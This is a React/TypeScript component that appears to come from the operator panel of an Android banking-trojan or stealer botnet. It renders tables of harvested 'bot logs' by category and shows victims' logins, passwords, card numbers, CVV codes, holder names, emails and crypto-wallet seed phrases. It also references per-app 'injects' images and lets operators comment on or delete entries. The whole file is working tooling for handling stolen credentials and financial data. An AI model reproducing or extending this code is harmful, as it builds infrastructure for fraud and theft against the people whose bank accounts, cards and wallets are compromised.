import React, {useEffect, useLayoutEffect, useState} from "react";
import {FilterValue, SorterResult, TablePaginationConfig} from "antd/lib/table/interface";
import {BotLog} from "../../Model/BotLog";
import {
    AndroidFilled, ClockCircleOutlined,
    CodeFilled, CreditCardFilled, DeleteFilled, DeleteOutlined, EditFilled,
    KeyOutlined, MailOutlined,
    OrderedListOutlined,
    UnorderedListOutlined,
    UserOutlined,
} from "@ant-design/icons";
import {Button, Pagination, Space, Table, Tooltip} from "antd";
import {logTypeHasImage} from "../../Util/logTypeHasImage";
import {getApiUrl} from "../../Util/config";
import {useDispatch, useSelector} from "react-redux";
import {AppState} from "../../Store/RootReducer";
import {changeLogsFilters, changeLogsSort, getLogsList, setLogsPage} from "../../Store/Logs/Actions";
import {setCountAction} from "../../Store/Counts/Actions";
import {scrollToTop} from "../../Util/scrollToTop";
import {ColumnType, Key} from "antd/es/table/interface";
import LogsFilter from "./LogsFilter";
import LogComment from "../Modals/LogComment/LogComment";
import DeleteLogModal from "../Modals/DeleteLog/DeleteLogModal";
import JsonLogDataToTemplate from "./JsonLogDataToTemplate";
import {hasAccess} from "../../Util/hasAccess";

export type logsType = "crypt" | "credit_cards" | "banks" | "stealers" | "wallets" | "emails" | "shops";

interface BotLogsTableProps {
    type: logsType,
    title: string,
}

interface BotLogsColumns<T> extends ColumnType<T> {
    isVisible?: boolean,
}

const BotLogsTable: React.FC<BotLogsTableProps> = (props: BotLogsTableProps) => {
    const [logIds, setLogIds] = useState<number[]>([]);
    const [deleteModal, setDeleteModal] = useState(false);
    const [logComment, setLogComment] = useState(false);

    const logsReducer = useSelector((state: AppState) => state.logs);

    const isLoaded = logsReducer.isLoaded && logsReducer.type === props.type &&
        logsReducer.isLoaded &&
        logsReducer.page === logsReducer.loaded_page &&
        logsReducer.loaded_per_page === logsReducer.per_page;

    const dispatch = useDispatch();

    useLayoutEffect(() => {
        if (logsReducer.type !== props.type) {
            if (logsReducer.filters.application !== "") {
                dispatch(changeLogsFilters({
                    application: "",
                }));
            }
            if (logsReducer.filters.query !== "") {
                dispatch(changeLogsFilters({
                    query: "",
                }));
            }
            if (logsReducer.sort.field !== "created_at" && logsReducer.sort.by !== "descend") {
                dispatch(changeLogsSort({
                    field: "created_at",
                    by: "descend",
                }));
            }
            // dispatch(setLogsPage(1, logsReducer.per_page));
        }

        dispatch(getLogsList(props.type, null, null, logsReducer.filters, logsReducer.sort, logsReducer.page, logsReducer.per_page));
    }, [props.type, logsReducer.filters, logsReducer.sort, logsReducer.page, logsReducer.per_page]);

    useEffect(() => {
        dispatch(setCountAction({
            [props.type]: 0,
        }));
    }, [logsReducer.total, dispatch, props.type]);

    const onTableChange = (
        pagination: TablePaginationConfig,
        filters: Record<string, FilterValue | null>,
        sorter: SorterResult<BotLog> | SorterResult<BotLog>[],
    ) => {
        const Sorter = sorter as SorterResult<BotLog>;
        scrollToTop();
        dispatch(changeLogsSort({
            field: Sorter.columnKey as string,
            by: Sorter.order as string,
        }));
    };

    const authReducer = useSelector((state: AppState) => state.auth);

    const columns: BotLogsColumns<BotLog>[] = [
        {
            title: "# ID",
            dataIndex: "id",
            key: "id",
            width: 70,
            sorter: true,
            sortDirections: ["ascend", "descend", "ascend"],
            render: (text: string) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>ID</h3>
                    </div>
                    <div className="table-col-item" style={{textAlign: "center"}}>
                        {text}
                    </div>
                </div>
            ),
            isVisible: true,
        },
        {
            title: (
                <>
                    <AndroidFilled/> Bot ID
                </>
            ),
            dataIndex: "bot_id",
            key: "bot_id",
            width: 300,
            sorter: true,
            sortDirections: ["ascend", "descend", "ascend"],
            render: (text: string, log: BotLog) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>Bot ID</h3>
                    </div>
                    <div className="table-col-item">
                        <a>{text}</a>
                        {log.comment && (
                            <div className="log-comment">
                                Comment: {log.comment}
                            </div>
                        )}
                    </div>
                </div>
            ),
            isVisible: true,
        },
        {
            title: (
                <>
                    <CodeFilled/> Application
                </>
            ),
            dataIndex: "application",
            key: "application",
            sorter: true,
            sortDirections: ["ascend", "descend", "ascend"],
            render: (application: string, log: BotLog) => (
                <>
                    <div className="table-col">
                        <div className="table-col-item">
                            <h3>Application</h3>
                        </div>
                        <div className="table-col-item">
                            <Space size={5}>
                                {logTypeHasImage(log.type) && (
                                    <img
                                        src={getApiUrl(`/injects/images/${log.type === "stealers" ? "crypt" : log.type}/${application}.png`)}
                                        width={16}
                                        alt={application}
                                    />
                                )}
                                {application}
                            </Space>
                        </div>
                    </div>
                </>
            ),
            isVisible: true,
        },
        {
            title: (
                <>
                    <UserOutlined/> Login
                </>
            ),
            dataIndex: "login",
            key: "login",
            render: (text: string, log: BotLog) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>Login</h3>
                    </div>
                    <div className="table-col-item">
                        {log.log.login ?? "-"}
                    </div>
                </div>
            ),
            isVisible: ["crypt", "banks", "shops", "wallets"].includes(props.type),
        },
        {
            title: (
                <>
                    <MailOutlined/> Email
                </>
            ),
            dataIndex: "email",
            key: "email",
            render: (text: string, log: BotLog) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>Email</h3>
                    </div>
                    <div className="table-col-item">
                        {log.log.email ?? "-"}
                    </div>
                </div>,
            isVisible: props.type === "emails",
        },
        {
            title: (
                <>
                    <KeyOutlined/> Password
                </>
            ),
            dataIndex: "password",
            key: "password",
            render: (text: string, log: BotLog) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>Password</h3>
                    </div>
                    <div className="table-col-item">
                        {log.log.password ?? "-"}
                    </div>
                </div>,
            isVisible: ["crypt", "banks", "shops", "wallets"].includes(props.type),
        },
        {
            title: (
                <>
                    <UserOutlined /> Name
                </>
            ),
            dataIndex: "name",
            key: "name",
            render: (text: string, log: BotLog) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>Name</h3>
                    </div>
                    <div className="table-col-item">
                        {log.log.name ?? "-"}
                    </div>
                </div>,
            isVisible: props.type === "emails",
        },
        {
            title: (
                <>
                    <UserOutlined /> Last name
                </>
            ),
            dataIndex: "surname",
            key: "surname",
            render: (text: string, log: BotLog) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>Last name</h3>
                    </div>
                    <div className="table-col-item">
                        {log.log.surname ?? "-"}
                    </div>
                </div>,
            isVisible: props.type === "emails",
        },
        {
            title: (
                <>
                    <UnorderedListOutlined/> Backup phrase
                </>
            ),
            dataIndex: "backupPhrase",
            key: "backupPhrase",
            render: (text: string, log: BotLog) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>Backup phrase</h3>
                    </div>
                    <div className="table-col-item">
                        {log.log.backupPhrase ? (
                            <span className="seed_phrase">{log.log.backupPhrase}</span>
                        ) : (
                            "-"
                        )}
                    </div>
                </div>,
            isVisible: props.type === "crypt",
        },
        {
            title: (
                <>
                    <CreditCardFilled /> Card number
                </>
            ),
            dataIndex: "cardNumber",
            key: "cardNumber",
            render: (text: string, log: BotLog) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>Card number</h3>
                    </div>
                    <div className="table-col-item">
                        {log.log.cardNumber ?? "-"}
                    </div>
                </div>,
            isVisible: props.type === "credit_cards",
        },
        {
            title: (
                <>
                    <UserOutlined /> Name
                </>
            ),
            dataIndex: "holderName",
            key: "holderName",
            render: (text: string, log: BotLog) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>Name</h3>
                    </div>
                    <div className="table-col-item">
                        {log.log.holderName ?? "-"}
                    </div>
                </div>,
            isVisible: props.type === "credit_cards",
        },
        {
            title: (
                <>
                    <UserOutlined /> Last Name
                </>
            ),
            dataIndex: "lastName",
            key: "lastName",
            render: (text: string, log: BotLog) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>Last Name</h3>
                    </div>
                    <div className="table-col-item">
                        {log.log.lastName ?? "-"}
                    </div>
                </div>,
            isVisible: props.type === "credit_cards",
        },
        {
            title: (
                <>
                    <CreditCardFilled /> CVV
                </>
            ),
            dataIndex: "CVV",
            key: "cvv",
            render: (text: string, log: BotLog) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>CVV</h3>
                    </div>
                    <div className="table-col-item">
                        {log.log.CVV ?? "-"}
                    </div>
                </div>,
            isVisible: props.type === "credit_cards",
        },
        {
            title: (
                <>
                    <UnorderedListOutlined/> Additional data
                </>
            ),
            dataIndex: "additional",
            key: "additional",
            render: (text: string, log: BotLog) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>Additional data</h3>
                    </div>
                    <div className="table-col-item">
                        {log.log.additional ? <JsonLogDataToTemplate log={log.log.additional}/> : "-"}
                    </div>
                </div>,
            isVisible: ["crypt", "banks", "credit_cards"].includes(props.type),
        },
        {
            title: (
                <>
                    <UnorderedListOutlined/> Seed phrase
                </>
            ),
            dataIndex: "phrase",
            key: "phrase",
            render: (text: string, log: BotLog) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>Additional data</h3>
                    </div>
                    <div className="table-col-item">
                        <span className="seed_phrase">
                            {log.log["phrase"] ? log.log["phrase"] : "-"}
                        </span>
                    </div>
                </div>,
            isVisible: props.type === "stealers",
        },
        {
            title: (
                <>
                    <ClockCircleOutlined /> Date
                </>
            ),
            dataIndex: "created_at",
            key: "created_at",
            sorter: true,
            defaultSortOrder: "descend",
            sortDirections: ["ascend", "descend", "ascend"],
            render: (text: string, log: BotLog) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>Date</h3>
                    </div>
                    <div className="table-col-item">
                        {log.created_at}
                    </div>
                </div>,
            isVisible: true,
        },
        {
            title: (
                <>
                    <OrderedListOutlined/> Actions
                </>
            ),
            dataIndex: "actions",
            width: 100,
            render: (text: string, botLog: BotLog) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>Actions</h3>
                    </div>
                    <div className="table-col-item">

                        <Space size="small">
                            {hasAccess(authReducer.user, props.type + ".editComment") && (
                                <Button
                                    type="primary"
                                    icon={<EditFilled/>}
                                    // shape="circle"
                                    onClick={() => {
                                        setLogIds([botLog.id]);
                                        setLogComment(true);
                                    }}
                                />
                            )}

                            {hasAccess(authReducer.user, props.type + ".delete") && (
                                <Button
                                    type="primary"
                                    icon={<DeleteFilled/>}
                                    // shape="circle"
                                    danger
                                    onClick={() => {
                                        setLogIds([botLog.id]);
                                        setDeleteModal(true);
                                    }}
                                />
                            )}
                        </Space>
                    </div>
                </div>
            ),
            isVisible: hasAccess(authReducer.user, `${props.type}.editComment`) || hasAccess(authReducer.user, `${props.type}.delete`),
        },
    ];

    const logsPaginationHandler = (pageNumber: number, size: number) => {
        if (logsReducer.isLoaded &&
            logsReducer.page === logsReducer.loaded_page &&
            logsReducer.page === logsReducer.loaded_page &&
            logsReducer.loaded_per_page === logsReducer.per_page) {
            scrollToTop();
            dispatch(setLogsPage(pageNumber, size));
        }
    };

    const [selectedRowKeys, setSelectedRowKeys] = useState<Key[]>([]);

    const selectedChange = (selectedRowKeys: Key[]) => {
        setSelectedRowKeys(selectedRowKeys);
    };

    const rowSelection = {
        selectedRowKeys,
        onChange: selectedChange,
    };

    return (
        <>
            <div className="panel-header">
                <h2 className="panel-title">{props.title}</h2>
            </div>

            <LogsFilter logsType={props.type}/>

            {(hasAccess(authReducer.user, props.type + ".editComment") || hasAccess(authReducer.user, props.type + ".delete")) && (
                <div className="panel-content">
                    <Space>
                        {hasAccess(authReducer.user, props.type + ".editComment") && (
                            <Tooltip title="Edit log">
                                <Button
                                    type="primary"
                                    icon={<EditFilled />}
                                    disabled={selectedRowKeys.length === 0}
                                    // shape="circle"
                                    onClick={() => {
                                        setLogIds(selectedRowKeys.map((key: Key) => key as number));
                                        setLogComment(true);
                                    }}
                                />
                            </Tooltip>
                        )}

                        {hasAccess(authReducer.user, props.type + ".delete") && (
                            <Tooltip title="Delete log">
                                <Button
                                    type="primary"
                                    icon={<DeleteOutlined />}
                                    disabled={selectedRowKeys.length === 0}
                                    // shape="circle"
                                    danger={true}
                                    onClick={() => {
                                        setLogIds(selectedRowKeys.map((key: Key) => key as number));
                                        setDeleteModal(true);
                                    }}
                                />
                            </Tooltip>
                        )}
                    </Space>
                </div>
            )}

            <div className="panel-content">
                <Table
                    columns={columns.filter((column) => column.isVisible)}
                    dataSource={logsReducer.logs}
                    size="small"
                    pagination={false}
                    loading={!isLoaded}
                    rowKey="id"
                    onChange={onTableChange}
                    rowSelection={rowSelection}
                />

                <br/>

                <Pagination
                    total={logsReducer.total}
                    defaultPageSize={logsReducer.per_page}
                    onChange={logsPaginationHandler}
                    current={logsReducer.page}
                    showSizeChanger={true}
                    disabled={logsReducer.loaded_page !== logsReducer.page || logsReducer.loaded_per_page !== logsReducer.per_page}
                />
            </div>

            <LogComment logIds={logIds} visible={logComment} setVisible={setLogComment}/>

            <DeleteLogModal logIds={logIds} visible={deleteModal} setVisible={setDeleteModal}/>
        </>
    );
};

export default BotLogsTable;
